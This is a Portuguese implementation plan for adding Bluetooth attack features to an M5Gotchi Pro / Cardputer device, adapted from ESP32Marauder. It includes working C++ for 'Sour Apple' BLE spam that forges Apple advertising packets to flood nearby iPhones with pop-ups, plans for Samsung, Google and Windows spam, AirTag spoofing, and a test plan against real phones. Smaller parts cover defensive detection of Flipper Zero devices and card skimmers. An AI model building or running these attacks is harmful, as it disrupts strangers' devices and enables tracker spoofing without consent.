# Plano de Implementação: Ataques Bluetooth

## Funcionalidades a Adicionar

### 1. BLE Spam Attacks
**Código Base:** ESP32Marauder `WiFiScan.cpp` linhas 3726-3805

#### Apple Sour Apple
- Envia pacotes BLE que causam pop-ups em iPhones
- Company ID: 0x4C (Apple Inc.)
- Tipos de ação: AirPods, AirTag, etc.

```cpp
// Estrutura do payload Apple
AdvData_Raw[i++] = 0x4C;  // Company ID
AdvData_Raw[i++] = 0x00;
AdvData_Raw[i++] = 0x0F;  // Type
AdvData_Raw[i++] = 0x05;  // Length
AdvData_Raw[i++] = 0xC1;  // Action Flags
```

#### Samsung Spam
- Causa pop-ups em dispositivos Samsung
- Company ID: 0x75, 0x00
- Modelos de relógios Galaxy

#### Google Fast Pair Spam
- Pop-ups em dispositivos Android
- Company ID: 0x2C, 0xFE
- Smart Controller Model ID

#### Microsoft Swiftpair
- Pop-ups em Windows 10/11
- Usa advertising data específico

### 2. AirTag Sniffing & Spoofing
**Código Base:** `WiFiScan.cpp` linhas 235-285

```cpp
// Detecta AirTags por payload
if (payLoad[i] == 0x4C && payLoad[i+1] == 0x00 && 
    payLoad[i+2] == 0x12 && payLoad[i+3] == 0x19) {
    // É um AirTag!
}
```

**Funcionalidades:**
- Listar AirTags detectados
- Salvar payloads
- Spoof (rebroadcast) AirTag detectado

### 3. Flipper Zero Detection
**Código Base:** `WiFiScan.cpp` linhas 285-303

```cpp
// Detecta por Company ID e payload
if (payLoad[i] == 0x81 && payLoad[i+1] == 0x30) {
    color = "Black";  // Flipper Zero Preto
}
```

### 4. Credit Card Skimmer Detection
**Código Base:** Detecta HC-03, HC-05, HC-06

```cpp
// Lista de nomes suspeitos
const char* skimmer_names[] = {
    "HC-03", "HC-05", "HC-06", "linvor"
};
```

---

## Integração com M5Gotchi Pro

### Estrutura de Menus
```
[Bluetooth Menu]
├── BLE Attacks
│   ├── Apple Spam (Sour Apple)
│   ├── Samsung Spam
│   ├── Google Spam
│   ├── Microsoft Spam (Swiftpair)
│   └── Spam All
├── Sniffers
│   ├── AirTag Sniff
│   ├── Flipper Sniff
│   ├── Skimmer Scan
│   └── General BLE Sniff
└── Spoofing
    └── Spoof AirTag
```

### Controles Cardputer
```
[BLE Attack Mode]
↑/↓ : Select attack type
ENTER : Start attack
ESC : Stop / Back to menu
```

---

## Código de Exemplo (Apple Sour Apple)

```cpp
void runAppleBLESpam() {
    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
    
    // Criar payload Apple
    uint8_t payload[17];
    payload[0] = 17 - 1;    // Length
    payload[1] = 0xFF;      // Manufacturer Specific
    payload[2] = 0x4C;      // Apple Inc.
    payload[3] = 0x00;
    payload[4] = 0x0F;      // Type
    payload[5] = 0x05;      // Length
    payload[6] = 0xC1;      // Action Flags
    payload[7] = random(0x27, 0xC0);  // Random action type
    // ... preencher resto
    
    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)payload, 17));
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
    
    NimBLEDevice::deinit();
}
```

---

## Dependências

### Bibliotecas Necessárias
```ini
lib_deps = 
    h2zero/NimBLE-Arduino@^1.4.1
```

### Configuração M5Stack
```cpp
#define HAS_BT  // Habilitar Bluetooth
```

---

## Testes

### 1. Apple Sour Apple
- **Alvo:** iPhone (iOS 14+)
- **Resultado esperado:** Pop-ups de AirPods/AirTag
- **Distância:** ~5 metros

### 2. AirTag Sniff
- **Alvo:** AirTag real
- **Resultado:** Detectar e mostrar MAC + payload
- **Salvar em:** /airtags.log

### 3. Flipper Sniff
- **Alvo:** Flipper Zero ligado
- **Resultado:** Detectar cor (Black/White/Transparent)
- **Mostrar:** Nome e MAC

---

## Referências
- ESP32Marauder: https://github.com/justcallmekoko/ESP32Marauder
- NimBLE-Arduino: https://github.com/h2zero/NimBLE-Arduino
- Apple Continuity Protocol: https://github.com/furiousMAC/continuity
